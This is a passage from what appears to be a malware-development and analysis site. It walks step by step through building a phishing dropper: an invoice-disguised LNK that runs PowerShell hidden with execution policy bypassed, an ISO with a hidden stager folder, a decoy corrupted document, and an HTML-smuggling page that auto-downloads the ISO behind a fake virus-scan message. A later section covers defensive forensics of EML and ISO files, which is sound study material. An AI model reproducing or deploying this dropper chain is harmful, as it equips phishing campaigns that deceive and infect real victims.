attachments.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/10%20Design/#the-con","title":"The Con","text":"<p>Phishing emails are the most common method by which malware is distributed. With this in mind, let's build a dropper for a hypothetical \"fraudulent charge\" phishing scam. In this common ruse, criminals pose as banks or online retailers, sending a \"fraud prevention\" notice to vitcims. The emails urge victims to respond quickly to avoid paying for a series of high-value purchases. We'll disguise our dropper as an invoice, attached to the phishing email, which will launch a malware stager.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/10%20Design/#design-goals","title":"Design Goals","text":"<p>Since this is a Proof-of-Concept (PoC) and not part of a real-world phishing campaign, we'll keep things simple and focus on the key elements of this common attack pattern:</p> <p><code>Phishing Email -&gt; HTML -&gt; ISO -&gt; LNK -&gt; Stager</code></p> <ol> <li>We'll create an HTML attachment designed to be sent via phishing email.</li> <li>The HTML will contain a Base64-encoded ISO, as well as some JavaScript code.</li> <li>The JavaScript will decode and \"download\" the ISO to the victim's computer.</li> <li>The ISO will contain a hidden directory and a LNK file, disguised as a WordPad document.</li> <li>The LNK file will launch a PowerShell stager located in the hidden directory.</li> </ol> <p>Since our focus is dropper desgign, we'll use a minimal stager. When the dropper is complete, it should be easy enough to swap this out for something more robust.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/10%20Design/#build-process","title":"Build Process","text":"<p>Now that we've defined our dropper's attack chain chronologically, we can begin building the dropper. It's important to note how each step depends on the others. The phishing email depends upon the existence of the HTML file, which depends upon the existence of the ISO, which is constructed from the LNK and stager code. Therefore, we'll need to build the dropper in reverse; once we've got a stager, we can create the LNK file. With these in-hand, we'll construct the ISO, which we'll then encode and embed into the HTML file, along with the JavaScript code necessary to trigger the download. Only then will the final HTML dropper be complete.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/10%20Design/#requirements","title":"Requirements","text":"<p>To build this dropper, we'll need access to a Windows VM with PowerShell installed.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/20%20LNK/","title":"Step 1: Stager and LNK","text":"Step 1: Stager and LNK"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/20%20LNK/#preparing-our-environment","title":"Preparing our Environment","text":"<p>In a Windows VM, create a new directory called <code>PoC Dropper</code>. Inside, create a subdirectory called <code>iso</code>, containing another subdirectory called <code>stager</code>. At the end of this section, once we've built the stager and LNK file, the directory tree will look like this:</p> <pre><code>PoC Dropper/\n\u251c\u2500\u2500 iso/\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Invoice_1234.doc.lnk\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 stager/\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 stager.ps1\n\u2514\u2500\u2500 make_lnk.ps1\n</code></pre> <p>The <code>iso</code> folder will be used for construction of the ISO file in Step 2.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/20%20LNK/#a-basic-stager","title":"A Basic Stager","text":"<p>We're designing a dropper to launch a stager. Thus, we'll need to build a stager before the dropper can be tested. There's no need to build a fully-functional stager though; a simple PoC will suffice. Since we're targeting Windows, we'll write our PoC stager in PowerShell:</p> <pre><code>\"Infected!\" | Out-File -FilePath $HOME\\Desktop\\INFECTED.TXT\n</code></pre> <p>When run, the script will write <code>Infected!</code> to a file called <code>INFECTED.TXT</code> on the victim's desktop. The TXT file proves the dropper's success. Save the script in the <code>stager</code> directory as <code>stager.ps1</code>.</p> <p>With that out of the way, let's build a dropper.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/20%20LNK/#lnk-construction","title":"LNK Construction","text":"<p>To entice victims, our dropper will be disguised as an invoice (per the \"fraudulent charge\" phishing scheme). To achieve this disguise, the LNK file will use the WordPad icon, so that it looks like a text document. In addition, it will use the <code>.doc.lnk</code> double-extension. By default, Windows hides the extensions of known filetypes; with the double-extension trick, coupled with the WordPad icon, it will appear as if the LNK is actually a Microsoft Word document.</p> <p>You may be wondering: \"If we're disguising the dropper as a Microsoft Word document, why are we usig an icon from WordPad?\" LNK files do not include built-in icons; instead, they \"borrow\" icons from other files on the system. If we use the MS Word icon, but the victim doesn't have MS Word installed, the LNK file icon will be broken, and the deception will be incomplete. This problem is averted with WordPad, which has been bundled with every Windows release since Windows 95.</p> <p>Our dropper doesn't have to be perfect. It just has to be good enough to fool one or two people.</p> <p>To construct the LNK file, we'll once again be using PowerShell. In the <code>PoC Dropper</code> directory, create a script called <code>make_lnk.ps1</code>, with the following contents:</p> <pre><code># Configure the launcher.\n$exe = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\";\n$args = \"-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File .\\stager\\stager.ps1\";\n$icon = \"C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe\";\n# Create the malicious LNK file.\n$wss = New-Object -ComObject WScript.Shell;\n$lnk = $wss.CreateShortcut(\".\\iso\\Invoice_1234.doc.lnk\");\n$lnk.WindowStyle = \"7\"; # 1 = Default; 3 = Maximized; 7 = Minimized\n$lnk.TargetPath = $exe;\n$lnk.Arguments = $args;\n$lnk.IconLocation = \"$icon,0\"; # Use the first icon from the target binary.\n$lnk.save();\n</code></pre> <p>Here's what the script does:</p> <ol> <li>Create a new <code>WScript.Shell</code> object.</li> <li>Use the resulting object to create a new LNK file at <code>.\\iso\\Invoice_1234.doc.lnk</code>.</li> <li>Set the <code>WindowStyle</code> attribute to <code>7</code>.<ul> <li>The available options are <code>1</code>, <code>3</code>, and <code>7</code>.</li> <li>Style <code>7</code> tells Windows to launch the shortcut in a minimized window.</li> </ul> </li> <li>Set the <code>TargetPath</code> and <code>Arguments</code> attributes to launch our stager.<ul> <li>Fun fact: These arguments can be abbreviated, and capitalization doesn't matter.</li> <li>E.g. this also works: <code>-non -nop -ex byp -w hid -fi .\\stager\\stager.ps1</code></li> </ul> </li> <li>Set the <code>IconLocation</code> to the first icon from <code>wordpad.exe</code>.<ul> <li>Some apps ship with multiple icons.</li> </ul> </li> <li>Save the <code>.lnk</code> file to the previously-specified location.</li> </ol> <p>Once the script is saved, run it with PowerShell:</p> <pre><code>C:\\Users\\MalDev\\Desktop\\PoC Dropper&gt;powershell.exe -file .\\make_lnk.ps1\n</code></pre> <p>When it's complete,\u00a0you should see the following items in the <code>iso</code> directory:</p> <p></p> <p>The <code>stager</code> directory contains the PoC PowerShell stager. The <code>Invoice_1234.doc.lnk</code> file uses the WordPad icon. Coupled with the double-extension trick, this completes the illusion.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/20%20LNK/#testing-the-dropper","title":"Testing the Dropper","text":"<p>Since our PoC stager is benign, we can safely test the LNK file. When executed, a new item appears on the task bar for a split second before vanishing:</p> <p></p> <p>If the dropper and stager worked properly, you will find a file called <code>INFECTED.TXT</code> on the desktop.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/20%20LNK/#improving-the-design","title":"Improving the Design","text":"<p>Thanks to the dropper's disguise, when a vitcim opens the file, they expect Microsoft Word (or another text editor) to appear. Yet, aside from the brief blip on the task bar, nothing happens! This may arouse suspicion. To account for this, we can create a real Microsoft Word document called <code>Invoice_1234.doc</code>, store it in the <code>stager</code> directory, and launch it along with the stager. Thus, while the victim examines an official-looking statement, our stager will run in the background.</p> <p>This, of course, requires us to design an official-looking statement. Producing an authentic-looking design can take significant time and effort; any inconsistency or flaw could break the deception. Therefore, we must spend painstaking hours ensuring that our fake invoice is absolutely perfect.</p> <p>Or, if you're like me, you could just say \"sod it\" and create a corrupted document. Here's how:</p> <ol> <li>Create a fake invoice file.<ul> <li>Don't worry about formatting.</li> <li>Slap an official-looking logo at the top of the page.</li> <li>List some expensive charges (such as a laptop and accessories).</li> <li>Maybe add an incomplete bit about how to appeal charges. Cut it off mid-sentence.</li> </ul> </li> <li>Save the file as <code>Invoice_1234.doc</code>, in the <code>stager</code> directory.</li> <li>Chop the file in half, resulting in a corrupted and incomplete document.</li> </ol> <p>Here's some PowerShell code to chop your DOC in half:</p> <pre><code>$relativepath = \"stager\\Invoice_1234.doc\";\n$fullpath = ($relativepath | Resolve-Path);\n$size = ((Get-Item $fullpath).length);\n$newsize = ($size - ($size % 2)) / 2; # Half size, in full bytes.\n$infile = [io.file]::OpenRead($fullpath);\n$buffer = New-Object byte[] $newsize;\n$infile.Read($buffer, 0, $newsize);\n$infile.close();\nRemove-Item -path $fullpath;\n$outfile = [io.file]::OpenWrite($fullpath);\n$outfile.Write($buffer, 0, $newsize);\n$outfile.close();\n</code></pre> <p>This opens the document, saves half of the file into a buffer, then deletes and re-creates the file with only half of its data. The result, when opened in Microsoft Word, will generate an error stating that the file could not be read. Faced with this error, victims may believe that the attachment got corrupted somehow, rather than suspecting malware. If they attempt file recovery, they'll see a bit of text, possibly even the embedded logo, as they would expect from a corrupted file.</p> <p>Launching the document as part of the LNK dropper is fairly straightforward; I'll leave this as an exercise for the reader. (For a hint, revisit the LNK section of the Dropper Basics page.)</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/30%20ISO/","title":"Step 2: Build the ISO","text":"Step 2: Build the ISO"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/30%20ISO/#iso-design","title":"ISO Design","text":"<p>Having completed the LNK dropper and its associated stager, we can now bundle them in an ISO. When the target opens the ISO, we only want them to see the LNK file, not the directory containing the stager code. Therefore, when making the ISO, we'll need to hide the <code>stager</code> directory.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/30%20ISO/#iso-construction","title":"ISO Construction","text":"<p>Windows provides simple tools for reading ISO files, but no built-in functionality for creating them. We'll use PowerShell, along with a custom ISO library, to put everything together.</p> <p>First, download the New-IsoFile.ps1 script and save it into the <code>PoC Dropper</code> directory. Then create a PowerShell script called <code>build_iso.ps1</code> in the same directory, with the following contents:</p> <pre><code>. .\\New-IsoFile.ps1; # Load the New-IsoFile cmdlet.\n\n# Hide the stager folder\nSet-ItemProperty -Path \"iso\\stager\" -Name \"Attributes\" -Value \"Hidden\";\n# Create the ISO\ndir -force iso | New-IsoFile -Path \"document_archive.iso\" -Media CDR -Title \"Documents\" -Force | Out-Null;\n# Un-hide the stager folder\nSet-ItemProperty -Path \"iso\\stager\" -Name \"Attributes\" -Value \"Normal\";\n</code></pre> <p>This script hides the <code>stager</code> directory, builds an ISO called <code>document_archive.iso</code> in the <code>PoC Dropper</code> directory, then un-hides the <code>stager</code> directory.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/30%20ISO/#confirming-the-build","title":"Confirming the Build","text":"<p>Before we send the ISO to a target, we need to confirm that it works. Double-click the resulting <code>document_archive.iso</code>. When it opens, you should see the <code>Invoice_1234.doc.lnk</code> file:</p> <p></p> <p>If we enable the Hidden items option in the View menu, we can see the hidden <code>stager</code> directory:</p> <p></p> <p>Success! We're now ready to build the HTML dropper.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/40%20HTML/","title":"Step 3: Assemble the HTML","text":"Step 3: Assemble the HTML"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/40%20HTML/#html-dropper-design","title":"HTML Dropper Design","text":"<p>With the ISO in-hand, we can begin constructing the HTML dropper. When opened, our HTML dropper will trigger the browser to \"download\" the ISO. We'll accomplish this using some clever JavaScript embedded in the HTML. For added measure, we'll make the HTML look as if it's performing a safety check on the file before initiating the download.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/40%20HTML/#create-the-html-template","title":"Create the HTML Template","text":"<p>Rather than put everything together by hand, we'll create a base HTML template, along with a PowerShell script that will inject the <code>document_archive.iso</code> file into the template. This way, we can easily replace the ISO without having to re-write the HTML file by hand. Here's our basic template:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;script&gt;\n            const filename = \"document_archive.iso\";\n            const contentBase64 = (\n                \"ISO_GOES_HERE\"\n            );\n            function triggerDownload() {\n                var element = document.createElement(\"a\");\n                element.setAttribute(\"href\", `data:application/octet-stream;base64,${contentBase64}`);\n                element.setAttribute(\"target\", \"_self\");\n                element.setAttribute(\"download\", filename);\n                element.style.display = \"none\";\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n            }\n        &lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body onload=\"triggerDownload()\"&gt;\n        &lt;b&gt;Scan complete! No viruses found. Downloading document archive...&lt;/b&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Save this file as <code>html_template.htm</code>, in the <code>PoC Dropper</code> directory.</p> <p>Our template is obviously not going to win any HTML design awards, but it'll suffice. When the HTML file finishes loading, the <code>triggerDownload</code> JavaScript function gets called. The function creates an invisible hyperlink, configures it to save the ISO file (embedded in the <code>contentBase64</code> variable), then automatically clicks the link. Once clicked, the JavaScript automatically removes the hyperlink from the page. For extra credibility, we've added a message to the body of the HTML which claims that the file was scanned before the download commenced.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/40%20HTML/#automate-the-html-build","title":"Automate the HTML Build","text":"<p>In order to complete the HTML dropper, we'll need to replace the <code>ISO_GOES_HERE</code> block with the Base64-encoded ISO file. We can do this with PowerShell. Create a new PowerShell script called <code>build_html.ps1</code>, in the <code>PoC Dropper</code> directory, with the following contents:</p> <pre><code># Read HTML from `html_template.htm`.\n$html = Get-Content -path \"html_template.htm\";\n\n# Base64-encode the ISO.\n$encodedIso = [convert]::ToBase64String((Get-Content -path \"document_archive.iso\" -Encoding byte));\n$splitLines = $encodedIso -split \"(.{78})\" | ? {$_};\n$encodedLines = $splitLines -join \"`\"`n                `\"\";\n\n# Replace the placeholder with the Base64-encoded ISO.\n$html = $html -replace \"ISO_GOES_HERE\", $encodedLines;\n\n# Write the HTML to `output.htm`.\n$html | Out-File -FilePath \"output.htm\" -Encoding ascii;\n</code></pre>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/40%20HTML/#build-the-html","title":"Build the HTML","text":"<p>With our script complete, we can execute the <code>build_html.ps1</code> script, which will produce the <code>output.htm</code> file. The <code>output.htm</code> will look something like this:</p> <pre><code>// [...]\nconst filename = \"document_archive.iso\";\nconst contentBase64 = (\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n    // [...]\n);\nfunction triggerDownload() {\n    var element = document.createElement(\"a\");\n    element.setAttribute(\"href\", `data:application/octet-stream;base64,${contentBase64}`);\n    element.setAttribute(\"target\", \"_self\");\n// [...]\n</code></pre> <p>Don't worry if it looks like the Base64 file is all <code>A</code>s; this is common for the filetype. Having confirmed the <code>output.htm</code> file was successfully written, we can rename it to <code>document.htm</code>, and it's ready for distribution!</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/40%20HTML/#improving-the-design","title":"Improving the Design","text":"<p>Our HTML dropper is complete, but there are plenty of ways it could be improved. For one, we could use stylesheets and JavaScript to create a more convincing page. If the target has some form of link protection (such as the one provided by Microsoft Defender 365), the HTML could be crafted to mimic its look and feel, so that it blends in with what the target is used to seeing. Some attackers tailor the HTML to appear as a file-sharing portal, like SharePoint or DropBox, lending similar credibility.</p> <p>Another pinch-point is the size of the <code>document.htm</code> file. While the contents of the ISO file are only a few kilobytes large, the ISO file itself can be a few megabytes in size. With our simple PoC stager, this isn't much of an issue, but bundling a larger stager could be a problem, as emails often have a limit on maximum attachment size. To account for this, one could use <code>gzip</code> compression to shrink the ISO, resulting in a much smaller file. However, this would require the JavaScript to decompress the ISO in-memory prior to triggering the download.</p> <p>We will leave these improvements as a challenge for the reader.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/20%20Introduction/","title":"20 Know the Enemy","text":"<p>\"If you know the enemy and know yourself, you need not fear the result of a hundred battles.\" ~Sun Tzu, The Art of War</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/20%20Introduction/#the-flip-side","title":"The Flip-Side","text":"<p>As mentioned in the Design Section, malware researchers and malware authors are two sides of the same coin. In this section, we'll explore the analytic methods, techniques and tools used to examine and understand malware samples, and how to perform such analysis safely. As before, this section is not a tutorial, but a reference. There is no single, \"correct\" way to analyze malware, and the techniques described here are only a subset of those available. I will expand this section over time, and I hope you will contribute, too!</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/20%20Introduction/#primary-objectives","title":"Primary Objectives","text":"<p>When analyzing malware, there are a few primary objectives you'll aim to achieve:</p> <ul> <li>Identify the source of the attack. (This is known as \"Attribution.\")</li> <li>Determine the attacker's specific goals.</li> <li>Enumerate the steps the attacker took to achieve their goals.</li> <li>Document the malware's capabilities and damage potential.</li> <li>Design detections and countermeasures to prevent future attacks.</li> </ul> <p>Attackers will do everything in their power to thwart analysis\u2014from obfuscating code to impede analysis, to employing the tactics of other well-known threat actors to muddle attribution. As a result, the analysis process can be difficult and time-consuming. In some cases, full-scale analysis can take weeks or months, with inconclusive results.</p> <p>The threat landscape evolves at a rapid pace; rather than attempting to perform a full analysis of every new sample, it is better to triage, prioritize, and analyze samples according to their potential impact, postponing lower-priority samples for later analysis.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/20%20Introduction/#regarding-attribution","title":"Regarding Attribution","text":"<p>When a breach takes place, the first question everyone asks is \"Who is responsible?\" This is often a difficult question to answer, and it is best to avoid haphazard guesses. Attribution can help defenders understand an adversary; if their strategies are known, defenders can respond accordingly. However, mis-attribution can cause defenders to focus in the wrong places, and can cause trouble when one group takes the blame for another's actions. It is common for advanced threat actors to imitate the behaviors of other threat actors, to muddle attribution.</p> <p>Rather than focusing heavily on attribution, it is better to ask, \"How can we detect and prevent this in the future?\" By analyzing how malware functions and propagates, we can reveal attack patterns\u2014and build defenses\u2014which are threat-agnostic. This protects systems against all attackers, not just specific threats.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/20%20Introduction/#keeping-it-safe","title":"Keeping it Safe","text":"<p>Malware analysis is a dangerous business. Malware authors are constantly developing new techniques, not only to thwart analysis, but in some cases, to damage or infect researchers' systems. It is essential to protect your analysis environment from data loss and infection. The following steps will help you keep your analysis environment safe:</p> <ul> <li>Maintain a dedicated analysis environment. Do not perform analysis on your production networks and systems. If you must perform analysis in production, ensure that you have clean backups, and if possible, isolate the system from the network to prevent lateral movement.</li> <li>Use virtual machines. Virtual machines are a great way to isolate your analysis environment. Ensure that you have a clean snapshot of the VM before you begin analysis, so that you can restore it quickly. If possible, use a disposable VM, such as Google's Spot VMs.</li> <li>Keep regular, redundant backups of essential data, such as analysis notes and samples. Test backups to ensure they work as expected.</li> <li>When interacting with attacker-owned C2 servers, use VPNs or disposable network interfaces. Do not use production networks and interfaces, which could reveal your identity to the attacker.</li> </ul>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/Emails/","title":"Introduction","text":"<p>Email is a ubiquitous form of communication, and has been one of the most-abused initial-access vectors throughout malware history. Whether exploiting vulnerabilities in the email client, or simply tricking the user into opening a malicious attachment, email is a fast and easy way to distribute malware.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/Emails/#eml-files","title":"EML Files","text":"<p>When reporting a malicious email, it is common for users to export the email as an <code>.eml</code> file, enabling them to safely pass the email along without risking further infection. In Outlook, this can be done by right-clicking the email and selecting \"Forward as Attachment.\" The resulting attachment will be an <code>.eml</code> file, which is a simple text file containing the email headers and body, as well as any included attachments. (For more information on <code>.eml</code> file syntax and structure, check out the documentation over at FileFormat.com.)</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/Emails/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>The quickest way to see what's in an <code>.eml</code> file is to open the email in an email client, such as Outlook. This is also the most dangerous approach, as it will execute any embedded macros or scripts. For this reason, it is recommended that you use a virtual machine or sandboxed environment for this analysis. Be sure to use a snapshot, so you can revert to a clean state if necessary.</p> <p>By using an email client (preferrably the one used by the phishing target), you can see the email as its author intended. You can see the message, the formatting, and embedded images or attachments. Phishers will often attempt to imitate the look and feel of legitimate emails, such as password-reset reminders or overdue payment notices. By viewing the email in an email client, you can see how the phisher crafted their deception. You can also extract attachments and images from the email, which may contain malware.</p> <p>One of the risks of this method is accidental execution of embedded code, or triggering call-backs to attacker-owned systems. For example, if the email loads a remote image, simply retrieving the image can give the attacker your IP and notify them that their phishing message was opened on your system. If the email exploits the email client, it could execute arbitrary code, and/or forward itself to all of the contacts in the system's address book. For these reasons, it's a good idea to keep your address book empty, and to disconnect the system from the Internet before opening the email.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/Emails/#static-analysis","title":"Static Analysis","text":"<p>If you don't want to risk executing the email, you can open it in a text editor. This will allow you to see the email headers and body, as well as any embedded attachments. However, you won't be able to see the formatting or images, and attachments will need to be extracted from the email before they can be analyzed. To top it off, the email will be in a format that is difficult for humans to read, and will require some effort to parse.</p> <p>To make life easier, you can parse emails in Python using the <code>email</code> module. This module provides a number of classes and functions for parsing and generating email messages. Here's an example of how to parse an email in Python:</p> <pre><code>&gt;&gt;&gt; import email\n&gt;&gt;&gt; with open(\"suspicious.eml\", \"r\") as f:\n...    eml = email.message_from_file(f)\n</code></pre> <p>This parses the email into a <code>Message</code> object, which is stored in the <code>eml</code> variable. To see the available headers that can be retrieved via the <code>get()</code> method, you can use the <code>keys()</code> method:</p> <pre><code>&gt;&gt;&gt; eml.keys()\n['Received', 'From', 'To', 'Subject', 'Thread-Topic', ...]\n</code></pre> <p>You can then access the email headers using the <code>get()</code> method:</p> <pre><code>&gt;&gt;&gt; print(eml.get(\"From\"))\nClive Russel &lt;clive.russel@scriptsharks.com&gt;\n&gt;&gt;&gt; print(eml.get(\"Subject\"))\nRe: Billing Statement\n</code></pre> <p>To determine the content type of a <code>Message</code> object, you can use the <code>get_content_type()</code> method:</p> <pre><code>&gt;&gt;&gt; eml.get_content_type()\n'multipart/mixed'\n</code></pre> <p>While some emails are simple and contain only a few headers and some text, others may comprise numerous conjoined sections. These are called \"multipart\" emails, and are often used to send HTML-formatted emails with embedded images or attachments. To determine whether an email is multipart, you can also use the <code>is_multipart()</code> method:</p> <pre><code>&gt;&gt;&gt; eml.is_multipart()\nTrue\n</code></pre> <p>To retrieve the contents of the email, you can use <code>get_payload()</code>. If the email is not multipart, this will return the body of the email as a string. If the email is multipart, this will return a list containing additional <code>Message</code> objects representing each part of the email:</p> <pre><code>&gt;&gt;&gt; eml.get_payload()\n[&lt;email.message.Message object at 0x107bc0340&gt;, ...]\n</code></pre> <p>Each of these objects can be parsed in the same way as the original email, and may themselves contain additional sections. To list all the parts a multipart email, you can use the <code>walk()</code> method:</p> <pre><code>&gt;&gt;&gt; for part in eml.walk():\n...     print(part.get_content_type())\n... \nmultipart/mixed\nmultipart/alternative\ntext/plain\ntext/html\ntext/html\n</code></pre> <p>The <code>walk()</code> method returns a generator object which itself returns an <code>Message</code> object for each part of the email. You can capture them in a list like so:</p> <pre><code>&gt;&gt;&gt; parts = list(eml.walk())\n&gt;&gt;&gt; parts\n[&lt;email.message.Message object at 0x1074206d0&gt;, ...]\n&gt;&gt;&gt; parts[0].get_content_type()\n'multipart/mixed'\n</code></pre> <p>You can check the filename and size of each part:</p> <pre><code>&gt;&gt;&gt; for index, part in enumerate(parts):\n...     if type(part.get_payload()) == str:\n...         print(f\"{index}: {part.get_filename()} ({len(part.get_payload())} bytes)\")\n...     else:\n...         print(f\"{index}: {part.get_content_type()}\")\n... \n0: multipart/mixed\n1: multipart/alternative\n2: None (249 bytes)\n3: None (3664 bytes)\n4: statement.htm (2691657 bytes)\n</code></pre> <p>In the above example, the two <code>None</code> parts are likely the body of the email, and the <code>statement.htm</code> part is the embedded attachment. We can grab the content of each section:</p> <pre><code>&gt;&gt;&gt; parts[2].get_payload()\n'Hi Gully,\\n\\nPlease review the attached billing statement and let me know ...'\n&gt;&gt;&gt; parts[3].get_payload()\n'&lt;html xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:w=\"urn:schemas...'\n</code></pre> <p>Modern email clients often include both a plaintext and HTML-formatted version of the email. This allows the client to display the email in the format that the user prefers. The two above sections represent the plaintext and HTML versions of the message body.</p> <p>To view a flat representation of a Message object, you can use the <code>as_string()</code> and <code>as_bytes()</code> methods:</p> <pre><code>&gt;&gt;&gt; # View message as string:\n&gt;&gt;&gt; strpart = parts[4].as_string()\n&gt;&gt;&gt; strpart[:70]\n'Content-Type: text/html; name=\"statement.htm\"\\nContent-Description: sta'\n&gt;&gt;&gt; # View message as bytes:\n&gt;&gt;&gt; binpart = parts[4].as_bytes()\n&gt;&gt;&gt; binpart[:70]\nb'Content-Type: text/html; name=\"statement.htm\"\\nContent-Description: sta'\n</code></pre> <p>Sometimes it may be beneficial to export the contents of a <code>Message</code> object. For example, the <code>statement.htm</code> attachment is a large and unwieldly HTML file, making it hard to manipulate in an interactive Python session. It will be easier to analyze the file in a text editor or browser. To extract the contents of a <code>Message</code> object, you can retrieve the object's payload:</p> <pre><code>&gt;&gt;&gt; contents = parts[4].get_payload()\n&gt;&gt;&gt; contents[:70]\n'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDxzdHlsZT4KICAgICAgICBodG'\n</code></pre> <p>In this case, the payload is Base64-encoded. We can decode this with the <code>base64</code> library:</p> <pre><code>&gt;&gt;&gt; from base64 import b64decode\n&gt;&gt;&gt; decoded = b64decode(contents)\n&gt;&gt;&gt; decoded[:70]\nb'&lt;!DOCTYPE html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n    &lt;style&gt;\\n        html {\\n            f'\n</code></pre> <p>From here, it is fairly simple to save the decoded <code>statement.htm</code> file:</p> <pre><code>&gt;&gt;&gt; fname = parts[4].get_filename()\n&gt;&gt;&gt; fname\n'statement.htm'\n&gt;&gt;&gt; with open(fname, \"wb\") as outfile:\n...     outfile.write(decoded)\n... \n1992525\n</code></pre> <p>In the above example, we use the <code>get_filename</code> from the <code>Message</code> object to find the original name of the attached file. However, we could just as easily name it whatever we want. Once the file has been written, it can be analyzed on its own:</p> <pre><code>analyst@labvm email_sample % head -n 10 statement.htm \n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;style&gt;\n        html {\n            font-size: calc(1em*.625);\n            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);\n        }\n        body {\n            font-family: \"Segoe UI\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\nanalyst@labvm email_sample %\n</code></pre> <p>For more information on using Python to manipulate <code>.eml</code> files, check out the official documentation.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/ISOs/","title":"ISO Files","text":"ISO Files <p>Files ending with <code>.iso</code> are uncompressed archives designed to represent physical, write-only storage media, such as CD-R and DVD-R discs. ISO files contain not only the full, uncompressed content of every file in the archive, but also the exact structure of the data and additional filesystem information. This enables the creation of \"perfect\" copies when burning the ISO to a physical disc. For more information, check out the FileFormat documentation for the ISO filetype.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/ISOs/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Most modern OSes (Linux, macOS, Windows) include bundled methods for accessing the contents of ISO files. In these OSes, double-clicking the file will mount it as a virtual disc drive, as if it were a physical disc. In addition, many archive management utilities (such as 7zip) allow users to extract the contents of an ISO file in the same manner as other archive types, such as <code>.zip</code>.</p> <p>While convenient, these methods come with risks. For example, if a Windows system is configured to automatically launch installers from CDs and DVDs, then mounting an ISO as a virtual drive could trigger the execution of malware.</p> <p>Opening an ISO with 7zip and similar utilities is a little safer, as they simply extract the archived files, rather than treating them as a virtual drive. However, there may still be risks.</p> <p>In either case, as with all malware, ISO files should be opened in a properly-isolated VM.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/ISOs/#static-analysis","title":"Static Analysis","text":""},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/ISOs/#via-pycdlib","title":"Via PyCDLib","text":"<p>It is also possible to examine ISO files interactively, using Python (or your language of choice). To demonstrate, we'll start with the <code>pycdlib</code> library. As this is not part of the standard library, you'll need to install it before it can be used:</p> <pre><code>(iso.venv) analyst@lab_vm iso.venv % pip install pycdlib\nCollecting pycdlib\n[...]\nSuccessfully installed pycdlib-1.13.0\n</code></pre> <p>With <code>pycdlib</code> installed, we can now explore a malware ISO file. First, we'll need to mount the ISO:</p> <pre><code>&gt;&gt;&gt; import pycdlib\n&gt;&gt;&gt; iso = pycdlib.PyCdlib()\n&gt;&gt;&gt; iso.open(\"documents.iso\")\n</code></pre> <p>With the ISO open, we can list the contents of the root directory:</p> <pre><code>&gt;&gt;&gt; for child in iso.list_children(iso_path=\"/\"):\n...     print(child.file_identifier())\n... \nb'.'\nb'..'\nb'DOCS'\nb'STATEM~1.LNK;1'\n</code></pre> <p>We can also list contents of subdirectories in the same manner:</p> <pre><code>&gt;&gt;&gt; for child in iso.list_children(iso_path=\"/DOCS/\"):\n...     print(child.file_identifier())\n... \nb'.'\nb'..'\nb'INSTALL.PS1;1'\nb'STATEM~1.DOC;1'\n</code></pre> <p>From our exploration, we can see the following directory structure:</p> <ul> <li><code>/</code><ul> <li><code>/STATEM~1.LNK</code></li> <li><code>/DOCS</code><ul> 